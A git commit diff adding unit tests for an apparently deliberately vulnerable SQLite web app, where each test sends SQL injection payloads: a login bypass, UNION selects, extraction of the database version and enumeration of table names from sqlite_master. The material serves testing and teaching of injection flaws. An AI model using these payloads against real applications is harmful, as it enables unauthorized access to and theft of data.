768f1f8233e980ddccc0442e9a9433de85ae5e88
m.faraponov <mikefaraponov@gmail.com>
2016-11-08 14:54:12 +0200

    Added more tests

--- tests/sqli_test.py
+++ tests/sqli_test.py
@@ -2,6 +2,7 @@ import os
 import pysql
 import unittest
 import tempfile
+import re
 from pysql.config import DATABASE
 from pysql.db import init_db
 
@@ -20,12 +21,26 @@ class AuthTestCase(unittest.TestCase):
             password=password
         ), follow_redirects=True)
 
+    def check_db_version_test(self):
+        self.select_sqli_test()
+        payload = "' union select sqlite_version(), 1, 1, 1 --"
+        rv = self.app.post('/', data=dict(q=payload))
+        assert re.search(b'\d\.\d\.\d', rv.data)
+
     def select_sqli_test(self):
         rv = self.login("' or 1=1 --", "doesn't matter")
         assert b'Search' in rv.data
 
     def union_sqli_test(self):
         self.select_sqli_test()
-        payload = dict(q="' union select 1, 1, 1, 1 --")
-        rv = self.app.post('/', data=payload)
+        payload = "' union select 1, 1, 1, 1 --"
+        rv = self.app.post('/', data=dict(q=payload))
         assert b"<b>Id:</b> 1, <b>Username:</b> 1, <b>Age:</b> 1, <b>Login:</b> 1" in rv.data
+
+    def get_secret_info_test(self):
+        self.select_sqli_test()
+        payload = "notavalidname' union select name, 1, 1, 1 "\
+                  "from sqlite_master "\
+                  "where type = 'table' limit 1 --"
+        rv = self.app.post('/', data=dict(q=payload))
+        assert re.search(b'<b>Id:</b> 1, <b>Username:</b> (\w+), <b>Age:</b> 1, <b>Login:</b> 1', rv.data)
